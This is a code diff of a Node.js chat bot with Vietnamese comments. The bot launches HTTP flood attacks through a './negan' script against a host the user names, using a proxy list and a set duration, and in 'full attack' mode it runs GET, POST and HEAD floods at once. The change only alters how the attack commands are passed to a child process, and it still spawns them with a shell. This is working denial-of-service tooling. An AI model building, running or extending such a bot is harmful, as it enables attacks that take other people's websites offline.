@@ -88,12 +88,12 @@ const initBot = () => {
             // Chạy lệnh tùy thuộc vào phương thức
             if (isFullAttack) {
                 // Chạy đồng thời 3 lệnh spawn với các phương thức HTTP khác nhau
-                runCommand(`${nodeOptions} node ./negan -m GET -u ${host} -p live.txt --full true -s ${attackTime}`, pid, userId, chatId, caller, host, attackTime);
-                runCommand(`${nodeOptions} node ./negan -m POST -u ${host} -p live.txt --full true -s ${attackTime}`, pid, userId, chatId, caller, host, attackTime);
-                runCommand(`${nodeOptions} node ./negan -m HEAD -u ${host} -p live.txt --full true -s ${attackTime}`, pid, userId, chatId, caller, host, attackTime);
+                runCommand(['node', './negan', '-m', 'GET', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
+                runCommand(['node', './negan', '-m', 'POST', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
+                runCommand(['node', './negan', '-m', 'HEAD', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
             } else {
                 // Chỉ chạy phương thức GET
-                runCommand(`${nodeOptions} node ./negan -m GET -u ${host} -p live.txt --full true -s ${attackTime}`, pid, userId, chatId, caller, host, attackTime);
+                runCommand(['node', './negan', '-m', 'GET', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
             }
 
             return;
@@ -111,9 +111,9 @@ const initBot = () => {
     process.on('unhandledRejection', restartBot);
 };
 
-const runCommand = (command, pid, userId, chatId, caller, host, attackTime) => {
-    console.log(`🚀 Đang chạy lệnh: ${command}`); // Debug log
-    const child = spawn(command, { shell: true });
+const runCommand = (args, pid, userId, chatId, caller, host, attackTime, nodeOptions) => {
+    console.log(`🚀 Đang chạy lệnh: node ${args.join(' ')}`); // Debug log
+    const child = spawn('node', [nodeOptions, ...args], { shell: true });
 
     child.stdout.on('data', (data) => {
         console.log(`stdout: ${data}`); // Debug log
@@ -124,12 +124,12 @@ const runCommand = (command, pid, userId, chatId, caller, host, attackTime) => {
     });
 
     child.on('close', (code) => {
-        console.log(`Lệnh ${command} đã kết thúc với mã ${code}`); // Debug log
+        console.log(`Lệnh node ${args.join(' ')} đã kết thúc với mã ${code}`); // Debug log
         handleCommandCompletion(null, null, null, pid, userId, chatId, caller, host, attackTime);
     });
 
     child.on('error', (err) => {
-        console.error(`Lỗi khi chạy lệnh ${command}:`, err); // Debug log
+        console.error(`Lỗi khi chạy lệnh node ${args.join(' ')}:`, err); // Debug log
         handleCommandCompletion(err, null, null, pid, userId, chatId, caller, host, attackTime);
     });
 
